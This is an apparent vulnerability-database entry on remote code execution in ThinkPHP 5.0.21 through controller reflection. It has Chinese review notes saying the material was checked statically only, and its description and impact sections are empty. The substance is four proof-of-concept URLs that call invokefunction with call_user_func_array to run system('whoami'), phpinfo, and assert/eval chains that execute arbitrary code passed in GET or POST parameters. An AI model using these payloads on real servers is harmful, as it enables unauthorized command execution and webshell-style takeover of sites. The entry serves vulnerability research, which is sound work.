---
source: "hatch 补库批 20260928"
product: "ThinkPHP / 控制器反射"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.0.21"
prerequisites: "来源所述条件，未列明部分仍待核：仅标题 5.0.21；无完整影响/修复范围，未独立证实该版本可利用"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-63947907f91566569f90bdcd"
entity_id: "ve-63947907f91566569f90bdcd"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅标题 5.0.21；无完整影响/修复范围，未独立证实该版本可利用

代码与实验材料：已全文读取全部载荷；仅静态分析，没有实验响应；部分包含写文件/下载副作用

来源证据范围：只有hatch补库标签，无原作者或原始漏洞资料

- **实验改动边界（1）**：前提、证据和归属不足；依据：四条invokefunction包含system/phpinfo及两种嵌套assert/eval；缺未强制路由和旧PHPassert条件。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **适用与权限边界（2）**：以单版本拆文件造成重复和误导；依据：简介及影响范围为空，标题版本不能代替实际组件/配置验证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.0.21

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、poc

    http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

### 2、poc

    http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

### 3、poc

    http://0-sec.org/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=system("whoami");

### 4、poc

    http://0-sec.org/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian])
